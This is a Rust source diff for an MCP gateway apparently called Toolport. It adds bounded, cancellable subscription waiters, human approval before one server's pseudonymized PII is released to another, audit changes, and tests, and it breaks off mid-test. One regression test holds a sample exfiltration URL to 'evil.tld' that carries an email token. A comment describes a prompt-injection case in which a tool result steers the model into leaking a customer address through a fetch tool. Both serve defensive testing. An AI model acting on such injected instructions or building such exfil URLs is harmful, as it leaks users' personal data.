@@ -590,16 +590,35 @@ const OPEN_GATE_MARGIN: Duration = Duration::from_secs(30);
 /// hardcoded, so raising the launcher budget can never silently make waiters give
 /// up before the leader they are waiting on (SOU-434).
 ///
-/// Note this is longer than any client request timeout, so a waiter can outlive the
-/// caller that queued it; bounding parked waiters is the remaining half of SOU-434.
+/// This can outlive a caller's deadline because MCP does not carry a portable deadline.
+/// Followers therefore also honor explicit cancellation and are bounded per gate (SBS-434).
 const OPEN_GATE_WAIT: Duration =
     Duration::from_secs(downstream::LEADER_OPEN_BUDGET.as_secs() + OPEN_GATE_MARGIN.as_secs());
+/// Maximum followers allowed to park behind one in-flight downstream subscribe. A real client
+/// needs one waiter; a storm must not turn a single slow server into an unbounded pile of blocked
+/// request workers (SBS-434).
+const MAX_OPEN_GATE_WAITERS_PER_URI: usize = 32;
+/// Cancellation has no Condvar notification, so a cancel-aware waiter checks at this cadence.
+const OPEN_GATE_CANCEL_POLL: Duration = Duration::from_millis(100);
 
 /// Coordinates concurrent first-subscriber races for one URI.
 struct OpenGate {
     /// `None` while the leader's downstream subscribe is in flight.
     result: Mutex<Option<Result<(), String>>>,
     cv: Condvar,
+    waiters: AtomicUsize,
+}
+
+/// One bounded follower slot. Releasing it in `Drop` covers success, timeout, cancellation, and
+/// unwinding without a second cleanup path.
+struct OpenGateWaiter<'a> {
+    gate: &'a OpenGate,
+}
+
+impl Drop for OpenGateWaiter<'_> {
+    fn drop(&mut self) {
+        self.gate.waiters.fetch_sub(1, Ordering::AcqRel);
+    }
 }
 
 impl OpenGate {
@@ -607,6 +626,7 @@ impl OpenGate {
         Arc::new(Self {
             result: Mutex::new(None),
             cv: Condvar::new(),
+            waiters: AtomicUsize::new(0),
         })
     }
 
@@ -619,34 +639,90 @@ impl OpenGate {
         self.cv.notify_all();
     }
 
-    fn wait(&self) -> Result<(), String> {
-        self.wait_for(OPEN_GATE_WAIT)
+    fn acquire_waiter(&self) -> Result<OpenGateWaiter<'_>, String> {
+        self.waiters
+            .fetch_update(Ordering::AcqRel, Ordering::Acquire, |current| {
+                (current < MAX_OPEN_GATE_WAITERS_PER_URI).then_some(current + 1)
+            })
+            .map_err(|_| {
+                format!(
+                    "too many clients are waiting for this resource subscription (limit {MAX_OPEN_GATE_WAITERS_PER_URI})"
+                )
+            })?;
+        Ok(OpenGateWaiter { gate: self })
+    }
+
+    fn wait(&self, cancel: Option<&downstream::CancelContext>) -> Result<(), String> {
+        self.wait_for_cancelable(OPEN_GATE_WAIT, cancel)
     }
 
     /// Wait for the leader with an explicit timeout (unit tests use a short one).
+    #[cfg(test)]
     fn wait_for(&self, timeout: Duration) -> Result<(), String> {
+        self.wait_for_cancelable(timeout, None)
+    }
+
+    fn wait_for_cancelable(
+        &self,
+        timeout: Duration,
+        cancel: Option<&downstream::CancelContext>,
+    ) -> Result<(), String> {
         let mut guard = self
             .result
             .lock()
             .unwrap_or_else(std::sync::PoisonError::into_inner);
+        if cancel.is_some_and(downstream::CancelContext::is_cancelled) {
+            return Err(
+                "resource subscription request was cancelled while waiting for another client"
+                    .into(),
+            );
+        }
+        if let Some(outcome) = guard.as_ref() {
+            return outcome.clone();
+        }
+        // Count only callers that will actually park. A follower can observe the gate in the
+        // table just before the leader finishes; by the time it gets here the result may already
+        // be ready, and that fast path must neither consume a slot nor fail at the cap.
+        let _waiter = self.acquire_waiter()?;
         let deadline = Instant::now() + timeout;
         while guard.is_none() {
+            if cancel.is_some_and(downstream::CancelContext::is_cancelled) {
+                return Err(
+                    "resource subscription request was cancelled while waiting for another client"
+                        .into(),
+                );
+            }
             let now = Instant::now();
             if now >= deadline {
                 return Err(
                     "timed out waiting for another client to open the resource subscription".into(),
                 );
             }
+            let remaining = deadline.saturating_duration_since(now);
+            let wait_for = if cancel.is_some() {
+                remaining.min(OPEN_GATE_CANCEL_POLL)
+            } else {
+                remaining
+            };
             let (next, wait_result) = self
                 .cv
-                .wait_timeout(guard, deadline.saturating_duration_since(now))
+                .wait_timeout(guard, wait_for)
                 .unwrap_or_else(std::sync::PoisonError::into_inner);
             guard = next;
-            if wait_result.timed_out() && guard.is_none() {
+            if wait_result.timed_out() && guard.is_none() && Instant::now() >= deadline {
                 return Err(
                     "timed out waiting for another client to open the resource subscription".into(),
                 );
             }
+        }
+        // Cancellation wins the finish/cancel race. A caller that stopped caring
+        // must not join the just-opened subscription merely because the leader
+        // published its result between our final poll and this wake-up.
+        if cancel.is_some_and(downstream::CancelContext::is_cancelled) {
+            return Err(
+                "resource subscription request was cancelled while waiting for another client"
+                    .into(),
+            );
         }
         match guard.as_ref() {
             Some(Ok(())) => Ok(()),
@@ -3872,6 +3948,7 @@ fn execute_call(
                 arguments: rehydrated_for_local_approver(reg, client, srv, &arguments),
                 tool_fingerprint: current_fp.clone(),
                 url_elicitation: None,
+                pii_release: None,
             };
             let mut approval_reason = reason;
             let (decision, held_ms, approved_fp, audit_approval) = if modern_direct_call {
@@ -3975,6 +4052,10 @@ fn execute_call(
                 approval::ApprovalReason::Destructive => "destructive",
                 approval::ApprovalReason::UntrustedSource => "untrusted_source",
                 approval::ApprovalReason::DestructiveAndUntrusted => "destructive_and_untrusted",
+                // Unreachable here: this gate comes from `gate_reason`, which never returns
+                // it. The PII release gate runs later, at the dispatch boundary, and audits
+                // itself in `approve_pii_release`.
+                approval::ApprovalReason::PiiCrossServer => "pii_cross_server",
             };
             if !decision.is_approved() {
                 // Governance audit: the gate reason and which non-approval outcome
@@ -4165,7 +4246,7 @@ fn execute_call(
     // Scoped to the executing server (SBS-605): a token only resolves for a server
     // that already produced that value. Anything else is refused here rather than
     // dispatched, which is what closes the cross-server exfiltration path.
-    let arguments = match rehydrate_for_downstream(client, srv, arguments) {
+    let arguments = match rehydrate_for_downstream(client, srv, name, arguments) {
         Ok(args) => args,
         Err(msg) => {
             return json!({
@@ -4182,7 +4263,7 @@ fn execute_call(
     // rehydration on the same leg. A host that answers an elicitation from model
     // context puts `⟦EMAIL_1⟧` in `inputResponses`, and the server would receive a
     // pseudonym where an address belongs (SBS-606).
-    let rehydrated_mrtr = match rehydrate_mrtr_for_downstream(client, srv, effective_mrtr) {
+    let rehydrated_mrtr = match rehydrate_mrtr_for_downstream(client, srv, name, effective_mrtr) {
         Ok(m) => m,
         Err(msg) => {
             return json!({
@@ -4234,7 +4315,8 @@ fn execute_call(
             } else {
                 recovery_hint(cached, srv)
             };
-            let out = defend_and_shape(reg, srv, tool, client, result, &trailer, shape);
+            let Defended { result: out, pii } =
+                defend_and_shape(reg, srv, tool, client, result, &trailer, shape);
             if let Some(profiler) = &mut call_profiler {
                 profiler.mark_postprocess();
             }
@@ -4245,7 +4327,7 @@ fn execute_call(
                 .and_then(|v| v.as_bool())
                 .unwrap_or(false);
             let err = if ok { None } else { Some(content_text(&out)) };
-            audit::record_timed_with_hash(
+            audit::record_timed_with_pii(
                 srv,
                 tool,
                 ok,
@@ -4253,6 +4335,7 @@ fn execute_call(
                 err.as_deref(),
                 client,
                 Some(&call_args_hash),
+                pii,
             );
             if let Some(profiler) = call_profiler {
                 profiler.finish();
@@ -4262,15 +4345,6 @@ fn execute_call(
         Err(e) => {
             finish_modern_hitl(active_modern_hitl.as_deref());
             let ms = started.elapsed().as_millis() as u64;
-            audit::record_timed_with_hash(
-                srv,
-                tool,
-                false,
-                Some(ms),
-                Some(&e),
-                client,
-                Some(&call_args_hash),
-            );
             // Live inspection: capture the failed call too, with the error
             // as the response body. Only when live_inspect is on.
             if let Some(req) = &inspect_args {
@@ -4286,7 +4360,10 @@ fn execute_call(
                 "content": [{ "type": "text", "text": e }],
                 "isError": true,
             });
-            defend_and_shape(
+            // Defend first, then audit: the error text runs through the same PII pass as
+            // a successful result, and the audit row has to carry that pass's count like
+            // the success path does (SBS-607).
+            let Defended { result: out, pii } = defend_and_shape(
                 reg,
                 srv,
                 tool,
@@ -4294,7 +4371,19 @@ fn execute_call(
                 result,
                 &recovery_hint(cached, srv),
                 shape,
-            )
+            );
+            let defended_err = audited_error_text(&e, &out);
+            audit::record_timed_with_pii(
+                srv,
+                tool,
+                false,
+                Some(ms),
+                Some(&defended_err),
+                client,
+                Some(&call_args_hash),
+                pii,
+            );
+            out
         }
     }
 }
@@ -4510,24 +4599,183 @@ fn with_pii_session<T>(client: Option<&str>, f: impl FnOnce(&mut pii::SessionMap
 /// putting a CRM's email in a URL for some unrelated fetch tool — so it fails the
 /// call instead of dispatching. Dispatching the literal token instead would leak
 /// nothing, but it would also silently send a request the user never meant.
+/// A refusal is not final: a human is asked whether to release the named values to this
+/// server, and on approval the pass is re-run (SBS-696). With no one to ask the refusal
+/// stands, which is why headless deployments keep exactly the old behaviour.
 fn rehydrate_for_downstream(
     client: Option<&str>,
     server: &str,
+    tool: &str,
     mut arguments: Value,
 ) -> Result<Value, String> {
     let origin = pii_origin_id(server);
-    let refused = with_pii_session(client, |map| {
-        pii::rehydrate_args(map, &origin, &mut arguments)
+    // A retry after approval must start from the ORIGINAL arguments: the first pass
+    // resolved this server's own tokens in place, and re-running over its output would be
+    // rehydrating already-rehydrated text. Held only when the map has something a pass
+    // could refuse, so the ordinary no-PII call does not pay for a clone.
+    let (pristine, refused) = with_pii_session(client, |map| {
+        if map.is_empty() {
+            return (None, std::collections::BTreeSet::new());
+        }
+        let pristine = arguments.clone();
+        let refused = pii::rehydrate_args(map, &origin, &mut arguments);
+        (Some(pristine), refused)
     });
-    if !refused.is_empty() {
-        let list = refused.into_iter().collect::<Vec<_>>().join(", ");
-        return Err(format!(
-            "refusing to send redacted values to '{server}': {list} came from a different server. \
-             Toolport only returns a value to the server that provided it, so one server's data \
-             cannot be routed to another."
-        ));
+    if refused.is_empty() {
+        return Ok(arguments);
     }
-    Ok(arguments)
+    if let Some(pristine) = pristine {
+        if approve_pii_release(client, server, tool, &refused, &pristine) {
+            let mut retry = pristine;
+            let still =
+                with_pii_session(client, |map| pii::rehydrate_args(map, &origin, &mut retry));
+            // Both checks are required. An empty `still` alone does NOT mean the release
+            // took effect: `pii::rehydrate` reports an unknown token as resolved-with-
+            // nothing rather than as a refusal, so a session map cleared during the human
+            // wait yields an empty set while the arguments still carry literal pseudonyms.
+            // Dispatching those would send a request the user never meant and log it as a
+            // successful release.
+            if still.is_empty() && all_tokens_substituted(&retry, &refused) {
+                return Ok(retry);
+            }
+        }
+    }
+    let list = refused.into_iter().collect::<Vec<_>>().join(", ");
+    Err(format!(
+        "refusing to send redacted values to '{server}': {list} came from a different server. \
+         Toolport only returns a value to the server that provided it, so one server's data \
+         cannot be routed to another. Approve the release in the Toolport app to allow it."
+    ))
+}
+
+/// Ask a human whether `refused` may be released to `server`, and record the grant.
+///
+/// Returns true only on an explicit approval, having already widened each token's origins
+/// so the caller's retry resolves. Every other outcome -- denied, no answer, and above all
+/// no reachable broker -- is false and leaves the map untouched.
+///
+/// The unreachable case is the headless answer the issue asks for: `request_human_decision`
+/// returns `Unreachable` when the desktop app is not running, so a gateway with nobody to
+/// ask refuses exactly as it did before this existed.
+fn approve_pii_release(
+    client: Option<&str>,
+    server: &str,
+    tool: &str,
+    refused: &std::collections::BTreeSet<String>,
+    arguments: &Value,
+) -> bool {
+    // Real values, read out of the session map for the prompt. They go to the loopback
+    // broker and nowhere else -- not the audit record below, not the model.
+    //
+    // These are also the binding record of WHAT was approved. The human decision takes up
+    // to two minutes, and the map can be cleared and re-minted by another session on
+    // another thread in that window, so the same token can stand for a different person by
+    // the time the answer arrives.
+    let values: Vec<approval::PiiReleaseValue> = with_pii_session(client, |map| {
+        refused
+            .iter()
+            .filter_map(|token| {
+                map.disclose(token).map(|d| approval::PiiReleaseValue {
+                    token: token.clone(),
+                    value: d.value.to_string(),
+                    origins: d.origins.iter().cloned().collect(),
+                })
+            })
+            .collect()
+    });
+    // A token that no longer discloses means the session map was cleared between the
+    // refusal and here. Asking about a value we can no longer name would be meaningless.
+    if values.len() != refused.len() {
+        return false;
+    }
+
+    let started = Instant::now();
+    let decision = request_human_decision(approval::ApprovalRequest {
+        token: String::new(),
+        id: new_correlation_id(),
+        client: client.map(str::to_string),
+        server: server.to_string(),
+        tool: tool.to_string(),
+        reason: approval::ApprovalReason::PiiCrossServer,
+        arguments: arguments.clone(),
+        // No fingerprint: this decision is about a value's destination, not about a tool
+        // definition, so it must never match a tool allowlist entry.
+        tool_fingerprint: None,
+        url_elicitation: None,
+        pii_release: Some(approval::PiiReleaseRequest {
+            server: server.to_string(),
+            // Cloned: the originals stay here as the record of what was on screen, to be
+            // re-checked against the map once the answer comes back.
+            values: values.clone(),
+        }),
+    });
+    // The audit record names the tokens' count via the args hash only -- `record_decision`
+    // hashes rather than stores, so the released values stay out of the log.
+    audit::record_decision(
+        server,
+        tool,
+        client,
+        "pii_cross_server",
+        decision_token(decision),
+        arguments,
+        Some(started.elapsed().as_millis() as u64),
+    );
+    if !decision.is_approved() {
+        return false;
+    }
+    let origin = pii_origin_id(server);
+    // Bind the grant to the VALUES the human was shown, not merely to the token ids. If a
+    // token now stands for someone else -- or for nothing, because the map was cleared --
+    // the approval on screen was for a different question, and widening origins on it
+    // would release a value nobody ever saw.
+    //
+    // Verified in full before anything is granted, under one lock: a partial grant would
+    // leave origins widened for a release the caller then refuses.
+    with_pii_session(client, |map| {
+        let unchanged = values.iter().all(|shown| {
+            map.disclose(&shown.token)
+                .is_some_and(|now| now.value == shown.value)
+        });
+        if !unchanged {
+            return false;
+        }
+        values
+            .iter()
+            .all(|shown| map.approve_origin(&shown.token, &origin))
+    })
+}
+
+/// The text a failed call is audited under.
+///
+/// The DEFENDED body, not `raw`. A downstream error is attacker-controlled and routinely
+/// echoes the arguments, so it can carry the very values the PII pass just removed from
+/// `defended` -- and the audit row now asserts `piiReplaced` beside it (SBS-607). Logging
+/// the raw string there would put an address in the append-only log while claiming
+/// redaction ran.
+///
+/// Falls back to `raw` only when the defended body has no text at all, so a failure is
+/// never audited with an empty reason.
+fn audited_error_text(raw: &str, defended: &Value) -> String {
+    let text = content_text(defended);
+    if text.trim().is_empty() {
+        raw.to_string()
+    } else {
+        text
+    }
+}
+
+/// True when none of `tokens` still appears literally in `value`.
+///
+/// The post-approval check an empty refused set cannot make on its own:
+/// [`pii::SessionMap::rehydrate`] deliberately reports an UNKNOWN token as
+/// resolved-with-nothing rather than as a refusal (the model may echo a token from another
+/// session, and there is no value behind it to leak). So a map cleared mid-approval yields
+/// "nothing refused" over arguments that still carry literal pseudonyms.
+fn all_tokens_substituted(value: &Value, tokens: &std::collections::BTreeSet<String>) -> bool {
+    let rendered = value.to_string();
+    tokens
+        .iter()
+        .all(|token| !rendered.contains(token.as_str()))
 }
 
 /// The same resolve-and-refuse pass as [`rehydrate_for_downstream`], for the MRTR
@@ -4545,6 +4793,7 @@ fn rehydrate_for_downstream(
 fn rehydrate_mrtr_for_downstream(
     client: Option<&str>,
     server: &str,
+    tool: &str,
     mrtr: Option<&MrtrRequest>,
 ) -> Result<Option<MrtrRequest>, String> {
     let Some(mrtr) = mrtr else {
@@ -4553,22 +4802,55 @@ fn rehydrate_mrtr_for_downstream(
     if mrtr.is_empty() {
         return Ok(None);
     }
-    let mut out = mrtr.clone();
     let origin = pii_origin_id(server);
-    let mut refused = std::collections::BTreeSet::new();
-    with_pii_session(client, |map| {
-        for field in [&mut out.input_responses, &mut out.request_state]
-            .into_iter()
-            .flatten()
-        {
-            refused.extend(pii::rehydrate_args(map, &origin, field));
+    // Same resolve-ask-retry shape as the arguments path. Sharing it matters: a retry
+    // response is exactly where a user has just typed the address an elicitation asked
+    // for, so leaving this half of the hop with no remedy would dead-end the workflow
+    // SBS-696 exists to unblock.
+    let pass = |out: &mut MrtrRequest| {
+        let mut refused = std::collections::BTreeSet::new();
+        with_pii_session(client, |map| {
+            for field in [&mut out.input_responses, &mut out.request_state]
+                .into_iter()
+                .flatten()
+            {
+                refused.extend(pii::rehydrate_args(map, &origin, field));
+            }
+        });
+        refused
+    };
+    let mut out = mrtr.clone();
+    let mut refused = pass(&mut out);
+    if !refused.is_empty() {
+        // The prompt shows the retry fields, not `arguments`: those are the values about
+        // to leave for this server. Built by hand under their wire names -- `MrtrRequest`
+        // is spliced into params rather than serialized, so it has no `Serialize` impl.
+        let shown = json!({
+            "inputResponses": mrtr.input_responses,
+            "requestState": mrtr.request_state,
+        });
+        if approve_pii_release(client, server, tool, &refused, &shown) {
+            let mut retry = mrtr.clone();
+            let still = pass(&mut retry);
+            // Same two-part check as the arguments path: an empty refused set does not by
+            // itself prove the release landed, because an unknown token resolves to
+            // nothing rather than refusing.
+            let substituted = [&retry.input_responses, &retry.request_state]
+                .into_iter()
+                .flatten()
+                .all(|field| all_tokens_substituted(field, &refused));
+            if still.is_empty() && substituted {
+                return Ok(Some(retry));
+            }
+            refused = if still.is_empty() { refused } else { still };
         }
-    });
+    }
     if !refused.is_empty() {
         let list = refused.into_iter().collect::<Vec<_>>().join(", ");
         return Err(format!(
             "refusing to send redacted values to '{server}' in a retry response: {list} came from \
-             a different server. Toolport only returns a value to the server that provided it."
+             a different server. Toolport only returns a value to the server that provided it. \
+             Approve the release in the Toolport app to allow it."
         ));
     }
     Ok(Some(out))
@@ -4609,7 +4891,11 @@ fn rehydrated_for_local_approver(
     copy
 }
 
-/// An incomplete pass is logged. This path fails OPEN -- a full map or an over-cap
+/// `None` when PII redaction is off for this call. `Some` carries the count and the
+/// `complete` flag out to the audit record, so Activity can show "N values
+/// pseudonymized" and, crucially, flag a pass that did not fully apply (SBS-607).
+///
+/// An incomplete pass is also logged. This path fails OPEN -- a full map or an over-cap
 /// result leaves values in the clear -- and the whole point of returning
 /// `complete` was so that could be noticed rather than assumed away.
 fn pseudonymize_if_enabled(
@@ -4617,9 +4903,9 @@ fn pseudonymize_if_enabled(
     client: Option<&str>,
     server: &str,
     result: &mut Value,
-) -> usize {
+) -> Option<audit::PiiPass> {
     if !reg.pii_redaction_effective() {
-        return 0;
+        return None;
     }
     let origin = pii_origin_id(server);
     let out = with_pii_session(client, |map| pii::pseudonymize_result(map, &origin, result));
@@ -4628,7 +4914,10 @@ fn pseudonymize_if_enabled(
             "toolport: PII pseudonymization was incomplete for this result - some values reached the model in the clear (the session map is full, or the result exceeded the scan cap)."
         );
     }
-    out.replaced
+    Some(audit::PiiPass {
+        replaced: out.replaced,
+        complete: out.complete,
+    })
 }
 
 fn defend_and_shape(
@@ -4639,14 +4928,14 @@ fn defend_and_shape(
     mut result: Value,
     trailer: &str,
     shape: bool,
-) -> Value {
+) -> Defended {
     // Scan untrusted output for injection; label always, optionally fail closed.
     // Block mode alone must still run the scanner: an org forceBlockOnInjection (or a
     // local blockOnInjection) with contentDefense off would otherwise silently do
     // nothing (SOU-345).
     // PII first, then injection defense: the wrap must go around already-
     // pseudonymized text, not the other way round.
-    pseudonymize_if_enabled(reg, client, srv, &mut result);
+    let pii = pseudonymize_if_enabled(reg, client, srv, &mut result);
     if reg.content_defense_effective() || reg.block_on_injection_effective() {
         let block = reg.should_block_injection_for(srv);
         if let Some(msg) = integrity::defend_content(srv, tool, &mut result, block) {
@@ -4684,7 +4973,19 @@ fn defend_and_shape(
             arr.push(json!({ "type": "text", "text": trailer }));
         }
     }
-    result
+    Defended { result, pii }
+}
+
+/// [`defend_and_shape`]'s output: the agent-facing result, plus what the PII pass did on
+/// the way through.
+///
+/// The pass runs deep inside this function but has to reach the audit record the CALLER
+/// writes, so it rides back out here rather than being logged in two places or
+/// recomputed (SBS-607).
+struct Defended {
+    result: Value,
+    /// `None` when PII redaction was off for this call -- see [`pseudonymize_if_enabled`].
+    pii: Option<audit::PiiPass>,
 }
 
 /// Exposed tool names for code-mode `servers.*` stubs: full catalog minus gateway
@@ -6904,6 +7205,7 @@ fn handle_resource_subscription(
     router: &Router,
     req: &Value,
     allowed: Option<&std::collections::HashSet<String>>,
+    cancel: Option<&downstream::CancelContext>,
     method: &str,
 ) -> Option<Value> {
     let id = match req.get("id") {
@@ -6999,7 +7301,7 @@ fn handle_resource_subscription(
                         }
                     }
                 }
-                BeginSubscribe::Wait(gate) => match gate.wait() {
+                BeginSubscribe::Wait(gate) => match gate.wait(cancel) {
                     Ok(()) => {
                         let mut table = state
                             .resource_subs
@@ -8141,6 +8443,7 @@ fn register_modern_subscription(
     router: &Router,
     req: &Value,
     allowed: Option<&std::collections::HashSet<String>>,
+    cancel: Option<&downstream::CancelContext>,
     owner: Option<&McpSessionOwner>,
     transport: ModernSubscriptionTransport,
 ) -> Result<(String, Arc<McpSession>), Value> {
@@ -8198,8 +8501,25 @@ fn register_modern_subscription(
             "params": { "uri": uri }
         });
         let _session = McpSessionGuard::enter(Some(key.clone()));
-        let response =
-            handle_resource_subscription(state, router, &subscribe, allowed, "resources/subscribe");
+        let response = handle_resource_subscription(
+            state,
+            router,
+            &subscribe,
+            allowed,
+            cancel,
+            "resources/subscribe",
+        );
+        if cancel.is_some_and(downstream::CancelContext::is_cancelled) {
+            // Earlier URIs in this same listen request may already have joined
+            // downstream subscriptions. Roll them all back before returning so a
+            // cancelled request cannot leave holders behind or publish a session.
+            cleanup_resource_subs_for_session(state, &key);
+            return Err(error(
+                response_id,
+                -32602,
+                "Toolport: resource subscription request was cancelled",
+            ));
+        }
         if response
             .as_ref()
             .is_some_and(|response| response.get("result").is_some())
@@ -8907,6 +9227,7 @@ fn broker_url_elicitation(
             origin: screened.origin,
             message: screened.message,
         }),
+        pii_release: None,
     });
     match decision {
         approval::ApprovalDecision::Approved => {
@@ -9652,6 +9973,7 @@ fn process_request(
             &router,
             req,
             allowed,
+            cancel.as_ref(),
             None,
             ModernSubscriptionTransport::Stdio,
         ) {
@@ -9686,7 +10008,7 @@ fn process_request(
         }
         let _era =
             UpstreamEraGuard::enter(declared.filter(|v| v.as_str() == MODERN_PROTOCOL_VERSION));
-        return handle_resource_subscription(state, &router, req, allowed, method);
+        return handle_resource_subscription(state, &router, req, allowed, cancel.as_ref(), method);
     }
     handle_request_with_cancel(
         req,
@@ -10517,6 +10839,11 @@ fn handle_mcp_http(
                     &router,
                     &req,
                     allowed,
+                    // The blocking HTTP parser has no request-lifetime cancellation
+                    // token: client disconnect becomes observable only when the
+                    // returned response body is written/read. Stdio requests do
+                    // carry their CancelContext through this same helper.
+                    None,
                     session_owner,
                     ModernSubscriptionTransport::Http,
                 ) {
@@ -12457,8 +12784,9 @@ mod tests {
         });
         let model_facing = json!({ "to": token });
 
-        let downstream = rehydrate_for_downstream(client, "crm", model_facing.clone())
-            .expect("the minting server may have its own value back");
+        let downstream =
+            rehydrate_for_downstream(client, "crm", "crm__lookup", model_facing.clone())
+                .expect("the minting server may have its own value back");
 
         assert_eq!(model_facing["to"], "⟦EMAIL_1⟧");
         assert_eq!(downstream["to"], "ada@example.com");
@@ -12469,6 +12797,9 @@ mod tests {
         // SBS-605 at the dispatch boundary: an injected result talks the model into
         // putting the CRM's customer address in a URL for an unrelated fetch tool.
         // This is the call that must never leave the machine.
+        // Refusal path: needs a guaranteed-broker-free env, or a stub broker published by
+        // a concurrent test would approve the release this test exists to prevent.
+        let _env = pii_test_env("pii-cross-server-regression");
         let client = Some("pii-cross-server-regression");
         with_pii_session(client, |map| {
             *map = pii::SessionMap::new();
@@ -12476,13 +12807,312 @@ mod tests {
         });
         let exfil = json!({ "url": "https://evil.tld/?e=⟦EMAIL_1⟧" });
 
-        let err = rehydrate_for_downstream(client, "http-fetch", exfil)
+        let err = rehydrate_for_downstream(client, "http-fetch", "http_fetch__get", exfil)
             .expect_err("a foreign token must fail the call, not dispatch");
 
         assert!(err.contains("⟦EMAIL_1⟧"), "name the token: {err}");
         assert!(
             !err.contains("ada@example.com"),
             "the refusal must not leak the value it is protecting: {err}"
+        );
+    }
+
+    /// A serialized, broker-free environment for a test that can hit the PII dispatch path.
+    ///
+    /// EVERY test that can produce a cross-server refusal must hold one, because the
+    /// refusal now dials the approval broker (SBS-696) and the data-dir override deciding
+    /// whether a broker exists is process-GLOBAL. Without this, a refusal test running
+    /// beside [`stub_broker`] dials that stub, is approved, and both tests fail: the
+    /// refusal test because its value was released, and the stub's owner because its one
+    /// `accept()` was consumed. That is exactly how this first failed on CI.
+    ///
+    /// Holding it also means a developer with the real desktop app running cannot have
+    /// these tests block on a live human prompt: the scratch dir has no descriptor unless
+    /// the test puts one there.
+    struct PiiTestEnv {
+        dir: std::path::PathBuf,
+        // Declaration order IS drop order: release the override before the lock, so the
+        // next test never observes this scratch dir.
+        _data_dir: conduit_lib::registry::DataDirOverride,
+        _env: std::sync::MutexGuard<'static, ()>,
+    }
+
+    fn pii_test_env(name: &str) -> PiiTestEnv {
+        let env = ENV_LOCK.lock().unwrap_or_else(|e| e.into_inner());
+        let dir = std::env::temp_dir().join(format!("toolport-{name}-{}", std::process::id()));
+        let _ = std::fs::remove_dir_all(&dir);
+        std::fs::create_dir_all(&dir).expect("a writable scratch dir");
+        let data_dir = conduit_lib::registry::DataDirOverride::set(&dir);
+        PiiTestEnv {
+            dir,
+            _data_dir: data_dir,
+            _env: env,
+        }
+    }
+
+    /// Publish a stub broker into `env`'s data dir that answers one request with
+    /// `decision`, handing back what it was asked.
+    fn stub_broker(
+        dir: &std::path::Path,
+        decision: approval::ApprovalDecision,
+    ) -> std::sync::mpsc::Receiver<approval::ApprovalRequest> {
+        stub_broker_with(dir, decision, || {})
+    }
+
+    /// [`stub_broker`], but running `during` after the request is read and BEFORE the
+    /// decision is written.
+    ///
+    /// That window is the real one: the human decision takes up to two minutes, and
+    /// another MCP session can clear or re-mint the map on another thread while it is open.
+    /// Running the mutation here reproduces it deterministically instead of by timing.
+    fn stub_broker_with(
+        dir: &std::path::Path,
+        decision: approval::ApprovalDecision,
+        during: impl FnOnce() + Send + 'static,
+    ) -> std::sync::mpsc::Receiver<approval::ApprovalRequest> {
+        let listener = TcpListener::bind(("127.0.0.1", 0)).expect("a loopback port");
+        let endpoint = listener.local_addr().expect("a bound address").to_string();
+        std::fs::write(
+            dir.join(approval::ENDPOINT_FILE),
+            serde_json::to_string(&approval::EndpointDescriptor {
+                endpoint,
+                token: "stub-broker-token".to_string(),
+            })
+            .expect("a serializable descriptor"),
+        )
+        .expect("a writable scratch dir");
+
+        let (tx, rx) = std::sync::mpsc::channel();
+        std::thread::spawn(move || {
+            use std::io::{BufRead, BufReader, Write};
+            let Ok((stream, _)) = listener.accept() else {
+                return;
+            };
+            let mut line = String::new();
+            let reader_stream = stream.try_clone().expect("a clonable stream");
+            if BufReader::new(reader_stream).read_line(&mut line).is_err() {
+                return;
+            }
+            if let Ok(req) = serde_json::from_str::<approval::ApprovalRequest>(&line) {
+                let _ = tx.send(req);
+            }
+            during();
+            let mut stream = stream;
+            let answer = serde_json::to_string(&decision).expect("a serializable decision");
+            let _ = stream.write_all(answer.as_bytes());
+            let _ = stream.write_all(b"\n");
+            let _ = stream.flush();
+        });
+        rx
+    }
+
+    #[test]
+    fn a_cross_server_refusal_stands_when_there_is_nobody_to_ask() {
+        // SBS-696 headless: the release is a HUMAN decision, so with no reachable broker
+        // the SBS-605 refusal is unchanged. This is the case that must never fail open.
+        // No stub broker published into this env: nothing for the gateway to dial.
+        let _env = pii_test_env("pii-release-headless");
+
+        let client = Some("pii-release-headless");
+        with_pii_session(client, |map| {
+            *map = pii::SessionMap::new();
+            map.pseudonymize("crm", "ada@example.com");
+        });
+
+        let err = rehydrate_for_downstream(
+            client,
+            "mailer",
+            "mailer__send",
+            json!({ "to": "⟦EMAIL_1⟧" }),
+        )
+        .expect_err("with no broker the refusal stands");
+
+        assert!(err.contains("⟦EMAIL_1⟧"), "name the token: {err}");
+        assert!(
+            !err.contains("ada@example.com"),
+            "the refusal must not leak the value it protects: {err}"
+        );
+        // The map must be untouched: an unanswered ask may not widen anything.
+        let still_refused =
+            with_pii_session(client, |map| map.rehydrate("mailer", "⟦EMAIL_1⟧").refused);
+        assert_eq!(
+            still_refused,
+            BTreeSet::from(["⟦EMAIL_1⟧".to_string()]),
+            "an unreachable broker must not grant the origin"
+        );
+    }
+
+    #[test]
+    fn an_approved_release_lets_the_retry_resolve_for_that_server_only() {
+        // The whole point of SBS-696: read a customer from the CRM, then mail them via a
+        // different server. The first pass refuses, a human approves, the retry dispatches
+        // the real address.
+        let env = pii_test_env("pii-release-approved");
+        let asked = stub_broker(&env.dir, approval::ApprovalDecision::Approved);
+
+        let client = Some("pii-release-approved");
+        with_pii_session(client, |map| {
+            *map = pii::SessionMap::new();
+            map.pseudonymize("crm", "ada@example.com");
+        });
+
+        let out = rehydrate_for_downstream(
+            client,
+            "mailer",
+            "mailer__send",
+            json!({ "to": "⟦EMAIL_1⟧" }),
+        )
+        .expect("an approved release resolves on the retry");
+        assert_eq!(out["to"], "ada@example.com");
+
+        // What the human was actually shown: the destination, the token, and the real
+        // value (the broker is the one audience that may see it), plus where it came from.
+        let req = asked
+            .recv_timeout(Duration::from_secs(10))
+            .expect("a prompt");
+        assert_eq!(req.reason, approval::ApprovalReason::PiiCrossServer);
+        assert!(
+            req.tool_fingerprint.is_none(),
+            "a release must never be able to match a tool allowlist entry"
+        );
+        let release = req.pii_release.expect("the release payload");
+        assert_eq!(release.server, "mailer");
+        assert_eq!(release.values.len(), 1);
+        assert_eq!(release.values[0].token, "⟦EMAIL_1⟧");
+        assert_eq!(release.values[0].value, "ada@example.com");
+        assert_eq!(release.values[0].origins, vec!["crm".to_string()]);
+
+        // The grant is scoped to the server that was approved. Asserted against the MAP,
+        // not against a second dispatch: the stub above accepts one connection and then
+        // drops its listener, so a second call would refuse for want of a broker whether or
+        // not the grant leaked, and the assertion would pass for the wrong reason.
+        let (approved, elsewhere) = with_pii_session(client, |map| {
+            (
+                map.rehydrate("mailer", "⟦EMAIL_1⟧").refused,
